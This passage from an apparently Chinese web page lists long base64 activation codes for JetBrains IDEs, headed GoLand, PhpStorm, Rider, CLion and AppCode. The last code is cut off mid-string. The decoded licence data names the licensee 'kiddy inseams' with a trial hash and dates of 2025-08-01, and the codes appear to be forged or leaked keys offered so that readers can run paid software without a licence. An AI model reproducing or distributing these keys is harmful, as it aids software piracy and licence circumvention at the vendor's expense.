class="line">FJVUHLU3X1-eyJsaWNlbnNlSWQiOiJGSlZVSExVM1gxIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBEQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiREIiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOmZhbHNlfSx7ImNvZGUiOiJQU0kiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX1dLCJtZXRhZGF0YSI6IjAxMjAyMjA4MDFQU0FOMDAwMDA1IiwiaGFzaCI6IlRSSUFMOi0yNDc1NjQ2MTIiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-IWA8NqxA1nOvfTGTVFX4PNAWRswj0hTsqntqWZcqcYFz/zIobEAYmHm0Lks82E0mPcNCzt0LPW6BfUZCI8f4r5E1nsonNS40bDv44qAcjBmQaLf5XxZLyoKRzl7YacDuqql+NY3tInFBX8Q4PQu56aVsS6DOZmeoO4fC66Qtwg2z+A+kvVpSlB3+1Fqww7SHZMuQbLlEOVSHqO2tf4bJVTIMH/OSMph5CpY4uJ8iv7yeBX+WQpcOy4tv1AZNEY9tIKI8nRVbnVnZaAf5R2ng1AduGCVSOaU1/ElLPReBvXTG6gZHtjKDHlAy2kq6JIH/CCeG/3ZkDLB0GzB29aSgHA==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="goland专用"><a class="markdownIt-Anchor" href="#goland专用">#</a> <strong>GoLand 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSUYBOSE34-eyJsaWNlbnNlSWQiOiJQU1VZQk9TRTM0IiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkdPIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUEdPIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDotNTIzMzE4Njc5IiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-JWZKP0AJWKSXcl1Ep6poGhauD7GlLMbPVMompa2zVsDzjP2L82BvMo0RZTPYcGiLnP7YL7kHUNFrn2wJiNlXVwp9AnXUvVTspDqhf5MwZ/W0Aug0HpJB0BVSPM7KRL41wyN2DHGyvRJ/w4/s057IQEZWUUy2HUUM1E48WqezS7HlKQBVrrD+IFjHE2Xv4xaPt/KBFXTn+MwWBiYcKsIdDurNKjHdRwo/Gl0umRc8/CFMYK6nrgoWA13PAgHMZioQPc4DK2aVCbCDECpTGoMIsKl2jZJei+wPfOf9Ud9i0/95YEyoK8/XnkUBzsm19quFegTEVp3HhT/EMheCuvMmeQ==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="phpstorm专用"><a class="markdownIt-Anchor" href="#phpstorm专用">#</a> <strong>PhpStorm 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZEW8I0GZC6-eyJsaWNlbnNlSWQiOiJaRVc4STBHWkM2IiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDo5NzM1MDQ0MzkiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-UVh/hXrqvTl8syZGee3sWsipAUdbN7XBg2XpFkSNh+oGBGzwvsj2k5A3v2LGO6+46rDU/HdG14jHYnT1iDMum5K5I7aCVYOIcJcmSAViwNDLqvTcOjMOdDZ4XS3aDg/KeaX5PozDa+H/KgHdGL07nKCBuhopAesiGXZC0RYerwCnYX1DjG9b/02igSyCuIYfsCO8d3GL+/ESz+sI8FiXmyZB7N413SJDGnp9klF51Kz469YzWZNEIXp9zg3Wu/Vsq8zlW9mGCFmsyiu0btTkS5PZfxp5BebH8Ef5SvPP7SyLJ2Q0FqeCJ9ESXp6aNBW8lmTVY+R0ZpqgsBOwbkq2xg==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="rider专用"><a class="markdownIt-Anchor" href="#rider专用">#</a> <strong>Rider 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BZPI62LS1G-eyJsaWNlbnNlSWQiOiJCWlBJNjJMUzFHIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlJEIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUERCIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBXUyIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX1dLCJtZXRhZGF0YSI6IjAxMjAyMjA4MDFQU0FOMDAwMDA1IiwiaGFzaCI6IlRSSUFMOjQyNzgxMDUyNCIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-UKWNg2MnWS+FD5dcOs1tir8BY/JFKGs53MiZa661VbcoBmRv+hY8hHmr71Cq1r8QMSgwL7tBEN2Bs8jSB0L1bZiNARXCIYS4IgsCL9fvg42XBOFva96qgKh3ho0PBe/xPuMabl7QLBT9E1ezzNnkZZJpq12957UZv+nWGCKgLt46WLotxxfMB/nFxgGB9uU1uXyEW84gStBYnLRv7d3Zvfdo0ANFbPmCUIpQlRqQ91TIJtYdj9l2ZbhkfVP30S3FOi0sYRnjR6Sqg0yHnFHqLGr1jG/wKEFusZPkr1bHWQsSTL/JI/sXHDQikvMcChFiN3HI1UeXleiKOwbhg00pBw==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="clion专用"><a class="markdownIt-Anchor" href="#clion专用">#</a> <strong>CLion 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CFUC0974F2-eyJsaWNlbnNlSWQiOiJDRlVDMDk3NEYyIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkNMIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDotMjA0MTkyNDM5OCIsImdyYWNlUGVyaW9kRGF5cyI6NywiYXV0b1Byb2xvbmdhdGVkIjpmYWxzZSwiaXNBdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlfQ==-f1foDndTa2abGqyTmiIMxYSRjoC16NxuD7QhoiOm0bzrHbqIuAXw7zsWC3U9RjqgWi/bj/8fjDpjywAFktScyATpClNXMzoR/nPJaY+J0iU+0ivubS9VERrIYL8O6WOT8PvNoqcdJ+MIK6jKY519y3VcUAd0N47ZKkpmzAOd9moR+j5ma3U8yuJno0oNtsAES7Lp3tzdMlhD7yn105jafY65bRPD8ezoc1c0GkFfsZ/1P3XPxoWeiS70wCSG32xNmcWygCROs3mnlDoamIv+K76G+jLlrR9csS/+vxWYaThfLKIvpwCDUX7xzdnXx8raXkr7c78ZshsNUQZuOgE8ww==-MIIETDCCAjSgAwIBAgIBDTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTIwMTAxOTA5MDU1M1oXDTIyMTAyMTA5MDU1M1owHzEdMBsGA1UEAwwUcHJvZDJ5LWZyb20tMjAyMDEwMTkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCUlaUFc1wf+CfY9wzFWEL2euKQ5nswqb57V8QZG7d7RoR6rwYUIXseTOAFq210oMEe++LCjzKDuqwDfsyhgDNTgZBPAaC4vUU2oy+XR+Fq8nBixWIsH668HeOnRK6RRhsr0rJzRB95aZ3EAPzBuQ2qPaNGm17pAX0Rd6MPRgjp75IWwI9eA6aMEdPQEVN7uyOtM5zSsjoj79Lbu1fjShOnQZuJcsV8tqnayeFkNzv2LTOlofU/Tbx502Ro073gGjoeRzNvrynAP03pL486P3KCAyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure>
<h2 id="appcode专用"><a class="markdownIt-Anchor" href="#appcode专用">#</a> <strong>AppCode 专用</strong></h2>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VKZAU5B43Y-eyJsaWNlbnNlSWQiOiJWS1pBVTVCNDNZIiwibGljZW5zZWVOYW1lIjoia2lkZHkgaW5zZWFtcyIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IlBTSSIsImZhbGxiYWNrRGF0ZSI6IjIwMjUtMDgtMDEiLCJwYWlkVXBUbyI6IjIwMjUtMDgtMDEiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUENXTVAiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IkFDIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyNS0wOC0wMSIsInBhaWRVcFRvIjoiMjAyNS0wOC0wMSIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDI1LTA4LTAxIiwicGFpZFVwVG8iOiIyMDI1LTA4LTAxIiwiZXh0ZW5kZWQiOnRydWV9XSwibWV0YWRhdGEiOiIwMTIwMjIwODAxUFNBTjAwMDAwNSIsImhhc2giOiJUUklBTDo4MjMzNzExNjIiLCJncmFjZVBlcmlvZERheXMiOjcsImF1dG9Qcm9sb25nYXRlZCI6ZmFsc2UsImlzQXV0b1Byb2xvbmdhdGVkIjpmYWxzZX0=-RrHOvDeSwoPjgraFAh3zGXDfoJ1hXOrZJroE/sKj/96CimH7YlD0An0lUEGvSEsovDprHWDZ4q2Wq11vukassv+avD1JHuurWhjp1mpIOvOntp2VHbBV9+iUxsr5ET+zJaIl0WiaRd6n75LeU4ZhxT4y6Da7cLbrqEawH+zjUuHzs60mUaqZ/5+j3qfVlwnx+iwPPu3dFtXWvADmcV/nb2jwnrJcLx9HMGVbS3yrgNoXhqXI+YRsYdNwYXbF7yVseGoxjKHQDBWTd3dAjWES/iC0s8xzLD7VXGkd3gID